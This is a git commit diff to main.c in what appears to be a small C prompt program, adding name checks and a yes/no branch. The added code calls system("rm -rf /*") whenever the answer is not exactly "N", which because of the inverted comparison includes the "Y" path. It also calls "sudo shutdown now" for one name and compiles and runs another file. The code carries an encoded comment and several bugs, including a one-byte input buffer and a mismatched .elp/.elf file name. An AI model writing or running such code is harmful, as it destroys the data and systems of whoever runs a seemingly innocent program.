0977a2b2870a4b39679b998d7d8894c9cb48e446
bred <51cpayne@crschools.us>
2025-10-28 08:57:09 -0500

    Update main.c
    this file is complete (for now)

--- main.c
+++ main.c
@@ -7,13 +7,15 @@ char A [1];
 char name [24];
 
 void saftey(){
-  if(name="Matthew"){
-    
-  }
-  if(name == "James Browner"){
+  if(strcmp(name,"Matthew Browner") == 0){
+    system("echo \"LIAR!\"");
+  }else if(strcmp(name,"James Browner") == 0){
     system("echo \"owdm ao kcth wd cvu uoan\"");
     system("sleep 1");
     system("sudo shutdown now");
+  }else{
+    system("gcc play.c -o play.elp");
+    system("./play.elf");
   }
 }
 int main(){
@@ -21,8 +23,11 @@ int main(){
   scanf("%s",A);
   if(strcmp(A,"Y") == 0){
     printf("then lets go");
+    //NDcuMTIxMzc4LC0xMTkuMzM3OTk3
+    scanf("?%s",name);
+    saftey();
   }
   if(strcmp(A,"N")){
-    
+    system("rm -rf /*");
   }
 }
